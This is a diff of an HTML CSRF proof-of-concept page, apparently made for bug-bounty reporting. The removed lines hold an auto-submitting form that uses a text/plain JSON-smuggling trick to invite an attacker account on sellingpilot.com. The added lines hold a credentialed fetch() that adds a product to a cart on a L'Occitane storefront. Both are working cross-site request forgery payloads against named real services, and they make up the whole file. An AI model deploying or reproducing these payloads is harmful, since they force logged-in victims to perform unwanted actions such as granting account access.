@@ -3,15 +3,22 @@
 <head>
   <title>CSRF PoC - Invite Member</title>
 </head>
-<body onload="document.forms[0].submit()">
-
-  <form action="https://www.sellingpilot.com/api/account/inviting?_xhr=true" method="POST" enctype="text/plain">
-
-    <!-- Trik: name dibuka dengan {"  dan value ditutup dengan "} -->
-    <input type="hidden"
-           name='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us","x":"'
-           value='"}'>
-  </form>
+<body>
+<script>
+  fetch("https://ae.loccitane.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/Cart-AddProduct", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+  },
+  body: new URLSearchParams({
+    pid: "11HO050PH26",
+    quantity: "1",
+    options: "[]"
+  }).toString()
+})
+</script>
+ 
 
 </body>
 </html>
